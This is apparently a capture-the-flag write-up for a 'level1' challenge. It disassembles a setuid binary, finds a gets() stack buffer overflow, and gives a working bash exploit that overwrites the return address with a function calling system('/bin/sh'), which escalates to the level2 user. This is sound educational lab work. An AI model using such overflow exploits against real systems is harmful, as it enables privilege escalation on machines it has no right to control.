level1
======

Dissassembly
------------

To dissassemble the executable we can use gdb.
```sh
FUNCTION=main EXECUTABLE=./level1
gdb -batch -ex "set disassembly-flavor intel" -ex "disassemble/r $FUNCTION" "$EXECUTABLE"
```

The main function looks like this:
```nasm
Dump of assembler code for function main:
   0x08048480 <+0>:     55                push   ebp
   0x08048481 <+1>:     89 e5             mov    ebp,esp
   0x08048483 <+3>:     83 e4 f0          and    esp,0xfffffff0
   0x08048486 <+6>:     83 ec 50          sub    esp,0x50
   0x08048489 <+9>:     8d 44 24 10       lea    eax,[esp+0x10]
   0x0804848d <+13>:    89 04 24          mov    DWORD PTR [esp],eax
   0x08048490 <+16>:    e8 ab fe ff ff    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    c9                leave
   0x08048496 <+22>:    c3                ret
End of assembler dump.
```

The stack looks like this:
| Address | Type          | Size |
|---------|---------------|------|
| -72     | char data[72] | 72   |
|   0     | *EBP          |  4   |
|  +4     | *EIP          |  4   |

Exploitation
------------

This is a typical case of stack-buffer overflow. This means we can overwrite data preceding the buffer on the stack, notably the return pointer preceding the buffer on the stack.

So let's see if we can exploit an existing function in the executable.

To list all functions we can use nm or objdump. Functions are located in the .text section:
```sh
objdump -M intel intel-mnemonic --disassemble ./level1
```

There is a function called `run`, which seams interesting:
```nasm
...
08048444 <run>:
 8048444:	55                   	push   ebp
 8048445:	89 e5                	mov    ebp,esp
 8048447:	83 ec 18             	sub    esp,0x18
 804844a:	a1 c0 97 04 08       	mov    eax,ds:0x80497c0
 804844f:	89 c2                	mov    edx,eax
 8048451:	b8 70 85 04 08       	mov    eax,0x8048570
 8048456:	89 54 24 0c          	mov    DWORD PTR [esp+0xc],edx
 804845a:	c7 44 24 08 13 00 00 	mov    DWORD PTR [esp+0x8],0x13
 8048461:	00
 8048462:	c7 44 24 04 01 00 00 	mov    DWORD PTR [esp+0x4],0x1
 8048469:	00
 804846a:	89 04 24             	mov    DWORD PTR [esp],eax
 804846d:	e8 de fe ff ff       	call   8048350 <fwrite@plt>
 8048472:	c7 04 24 84 85 04 08 	mov    DWORD PTR [esp],0x8048584
 8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
 804847e:	c9                   	leave
 804847f:	c3                   	ret
...

```
We can see a call to system here:
```
8048472:	c7 04 24 84 85 04 08 	mov    DWORD PTR [esp],0x8048584
8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
```

The argument pushed on the stack is a string that is going to be executed with the level2 user's set-uid privileges.
Let's look at the string's content:
```sh
EXECUTABLE=level1
ADDRESS=0x8048584
gdb -batch -ex "x/s $ADDRESS" "$EXECUTABLE"
```

We can see that there already is all we need to gain the level2 user's privileges:
```
0x8048584:	 "/bin/sh"
```

All that is left to do is to craft an input string long enough to overflow the data array, and the base-pointer's value `*EBP` to be able to overwrite the return-pointer's value `*EIP`.

```sh
> /tmp/level1.sh cat << EOF
```
```bash
#!/usr/bin/env bash
PADDING_LEN=76 # sizeof(data) + sizeof(*EBP)

RETURN_ADDRESS='08048444' # The address of the run function

PADDING=$(printf "%.0sA" $(seq -s' ' "$PADDING_LEN"))
BYTES=$(<<< "$RETURN_ADDRESS" rev | dd conv=swab | xxd -r -p)

echo "$PADDING$BYTES"
```
```sh
EOF
chmod +x /tmp/level1.sh
```

```sh
(/tmp/level1.sh; cat) | ./level1
```
```
Good... Wait what?
whoami
level2
```
